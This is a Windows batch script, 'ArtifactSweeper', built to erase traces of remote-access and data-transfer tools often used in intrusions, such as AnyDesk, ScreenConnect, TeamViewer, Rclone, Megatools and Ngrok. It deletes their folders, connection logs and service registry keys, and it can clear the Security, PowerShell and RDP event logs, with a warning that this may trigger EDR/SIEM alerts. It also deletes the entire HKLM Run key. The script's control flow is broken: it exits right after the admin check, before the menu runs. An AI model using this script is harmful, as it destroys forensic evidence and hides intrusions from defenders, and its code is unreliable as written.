@echo off
setlocal enabledelayedexpansion

:: ----------------------------------------
:: ArtifactSweeper - Modular Cleanup
:: Choose which tool to clean
:: ----------------------------------------

:: Check admin rights
whoami /groups | find "S-1-5-32-544" >nul
if %errorlevel% neq 0 (
    echo This script must be run as Administrator.
    pause
    exit /b
)

:: Utility: Delete folder
:del_folder
if exist "%~1" (
    echo Deleting folder: %~1
    rmdir /s /q "%~1"
)
exit /b

:: Utility: Delete file
:del_file
if exist "%~1" (
    echo Deleting file: %~1
    del /f /q "%~1"
)
exit /b

:: Utility: Delete registry
:del_reg
reg query "%~1" >nul 2>&1
if %errorlevel% equ 0 (
    echo Deleting registry key: %~1
    reg delete "%~1" /f >nul 2>&1
)
exit /b

:: Prompt about logs
echo.
echo === WARNING ===
echo Some cleanup modules may attempt to clear Windows Event Logs.
echo This could trigger EDR/SIEM alerts.
choice /m "Do you want to allow event log cleanup?"
if %errorlevel% neq 1 (
    set SKIP_LOGS=1
)

:: Menu
:menu
cls
echo Select tool to clean:
echo.
echo  1. AnyDesk
echo  2. Atera
echo  3. ConnectWise
echo  4. LogMeIn
echo  5. Remote Utilities
echo  6. Splashtop
echo  7. Supremo
echo  8. TeamViewer
echo  9. TightVNC
echo 10. FileZilla
echo 11. FreeFileSync
echo 12. GoodSync
echo 13. Megatools
echo 14. Ngrok
echo 15. Rclone
echo 16. WinSCP
echo  A. All modules
echo  X. Exit
echo.
set /p choice="Enter your choice (1-16, A, X): "

if /i "%choice%"=="1" call :clean_anydesk
if /i "%choice%"=="2" call :clean_atera
if /i "%choice%"=="3" call :clean_connectwise
if /i "%choice%"=="4" call :clean_logmein
if /i "%choice%"=="5" call :clean_remoteutilities
if /i "%choice%"=="6" call :clean_splashtop
if /i "%choice%"=="7" call :clean_supremo
if /i "%choice%"=="8" call :clean_teamviewer
if /i "%choice%"=="9" call :clean_tightvnc
if /i "%choice%"=="10" call :clean_filezilla
if /i "%choice%"=="11" call :clean_freefilesync
if /i "%choice%"=="12" call :clean_goodsync
if /i "%choice%"=="13" call :clean_megatools
if /i "%choice%"=="14" call :clean_ngrok
if /i "%choice%"=="15" call :clean_rclone
if /i "%choice%"=="16" call :clean_winscp
if /i "%choice%"=="A" goto clean_all
if /i "%choice%"=="X" exit /b
goto menu

:: Cleanup modules

:clean_anydesk
echo Cleaning AnyDesk...
call :del_folder "%ProgramFiles(x86)%\AnyDesk"
call :del_folder "%ProgramFiles%\AnyDesk"
call :del_folder "%ProgramData%\AnyDesk"
call :del_folder "%APPDATA%\AnyDesk"
call :del_file "%ProgramData%\AnyDesk\connection_trace.txt"
call :del_file "%APPDATA%\AnyDesk\ad.trace"
call :del_reg "HKLM\SYSTEM\CurrentControlSet\Services\AnyDesk"
goto :eof

:clean_atera
echo Cleaning Atera...
call :del_folder "%ProgramFiles(x86)%\Atera Networks"
call :del_folder "%ProgramFiles%\Atera Networks"
call :del_folder "%ProgramFiles%\ATERA Networks\AteraAgent\Packages"
call :del_file "%windir%\Temp\AteraSetupLog.txt"
call :del_reg "HKLM\SYSTEM\CurrentControlSet\Services\AteraAgent"
call :del_reg "HKLM\Software\Atera Networks"
call :del_reg "HKLM\Software\Atera Networks\AlphaAgent"
goto :eof

:clean_connectwise
echo Cleaning ConnectWise...
for /D %%G in ("%ProgramFiles(x86)%\ScreenConnect Client*") do call :del_folder "%%G"
call :del_folder "%SystemRoot%\TEMP\ScreenConnect"
call :del_reg "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client"
goto :eof

:clean_logmein
echo Cleaning LogMeIn...
call :del_folder "%ProgramFiles(x86)%\LogMeIn"
call :del_folder "%LocalAppData%\LogMeIn"
call :del_folder "%ProgramData%\LogMeIn"
call :del_file "%ProgramData%\Microsoft\Windows\Start Menu\Programs\LogMeIn Control Panel.lnk"
call :del_reg "HKLM\SYSTEM\CurrentControlSet\Services\LogMeIn"
call :del_reg "HKLM\SYSTEM\CurrentControlSet\Services\LMIGuardianSvc"
call :del_reg "HKLM\SYSTEM\CurrentControlSet\Services\LMIInfo"
call :del_reg "HKLM\SYSTEM\CurrentControlSet\Services\LMIMaint"
call :del_reg "HKLM\SYSTEM\CurrentControlSet\Services\LMIRfsDriver"
call :del_reg "HKLM\SOFTWARE\LogMeIn\V5"
call :del_reg "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
goto :eof

:clean_remoteutilities
echo Cleaning Remote Utilities...
call :del_folder "%ProgramFiles(x86)%\Remote Utilities - Host"
call :del_folder "%APPDATA%\Remote Utilities Agent"
call :del_folder "%ProgramFiles(x86)%\Remote Utilities - Host\Logs"
call :del_folder "%APPDATA%\Remote Utilities Agent\Logs"
call :del_reg "HKLM\SYSTEM\CurrentControlSet\Services\RManService"
call :del_reg "HKCU\Software\Usoris"
call :del_reg "HKLM\Software\Usoris"
goto :eof

:clean_splashtop
echo Cleaning Splashtop...
call :del_folder "%ProgramFiles(x86)%\Splashtop"
call :del_folder "%ProgramData%\Splashtop"
call :del_folder "%LOCALAPPDATA%\Splashtop"
call :del_file "%ProgramFiles(x86)%\Splashtop\Splashtop Remote\Server\log\SPLog.txt"
call :del_file "%ProgramData%\Splashtop\Temp\log\FTCLog.txt"
call :del_reg "HKLM\SYSTEM\CurrentControlSet\Services\SplashtopRemoteService"
call :del_reg "HKLM\SYSTEM\CurrentControlSet\Services\SSUService"
call :del_reg "HKLM\SOFTWARE\WOW6432Node\Splashtop Inc.\Splashtop Remote Server"
goto :eof

:clean_supremo
echo Cleaning Supremo...
call :del_folder "%ProgramFiles(x86)%\Supremo"
call :del_folder "%ProgramData%\SupremoRemoteDesktop"
call :del_reg "HKLM\SYSTEM\CurrentControlSet\Services\SupremoService"
goto :eof

:clean_teamviewer
echo Cleaning TeamViewer...
call :del_folder "%ProgramFiles(x86)%\TeamViewer"
call :del_folder "%ProgramFiles%\TeamViewer"
call :del_folder "%TEMP%\TeamViewer"
call :del_reg "HKLM\SYSTEM\CurrentControlSet\Services\TeamViewer"
goto :eof

:clean_tightvnc
echo Cleaning TightVNC...
call :del_folder "%ProgramFiles(x86)%\TightVNC"
call :del_folder "%ProgramFiles%\TightVNC"
call :del_reg "HKLM\SYSTEM\CurrentControlSet\Services\tvnserver"
goto :eof

:clean_filezilla
echo Cleaning FileZilla...
call :del_folder "%ProgramFiles%\FileZilla FTP Client"
call :del_folder "%APPDATA%\FileZilla"
goto :eof

:clean_freefilesync
echo Cleaning FreeFileSync...
call :del_folder "%ProgramFiles(x86)%\FreeFileSync"
call :del_folder "%ProgramFiles%\FreeFileSync"
call :del_folder "%APPDATA%\FreeFileSync"
goto :eof

:clean_goodsync
echo Cleaning GoodSync...
call :del_folder "%ProgramData%\Siber Systems\GoodSync"
call :del_folder "%LOCALAPPDATA%\GoodSync"
call :del_reg "HKLM\SYSTEM\CurrentControlSet\Services\GsServer"
goto :eof

:clean_megatools
echo Cleaning Megatools...
call :del_file "%TEMP%\*.megatools.cache"
call :del_file ".\mega.ini"
goto :eof

:clean_ngrok
echo Cleaning Ngrok...
call :del_folder "%LOCALAPPDATA%\ngrok"
goto :eof

:clean_rclone
echo Cleaning Rclone...
call :del_folder "%APPDATA%\rclone"
call :del_folder "%LOCALAPPDATA%\rclone"
goto :eof

:clean_winscp
echo Cleaning WinSCP...
call :del_folder "%ProgramFiles(x86)%\WinSCP"
call :del_folder "%USERPROFILE%\AppData\Local\Programs\WinSCP"
goto :eof

:clean_all
call :clean_anydesk
call :clean_atera
call :clean_connectwise
call :clean_logmein
call :clean_remoteutilities
call :clean_splashtop
call :clean_supremo
call :clean_teamviewer
call :clean_tightvnc
call :clean_filezilla
call :clean_freefilesync
call :clean_goodsync
call :clean_megatools
call :clean_ngrok
call :clean_rclone
call :clean_winscp

if not defined SKIP_LOGS (
    echo Clearing common event logs...
    wevtutil cl Security >nul 2>&1
    wevtutil cl "Windows PowerShell" >nul 2>&1
    wevtutil cl "Microsoft-Windows-PowerShell/Operational" >nul 2>&1
    wevtutil cl Application >nul 2>&1
    wevtutil cl "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" >nul 2>&1
    wevtutil cl "Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational" >nul 2>&1
)

goto menu
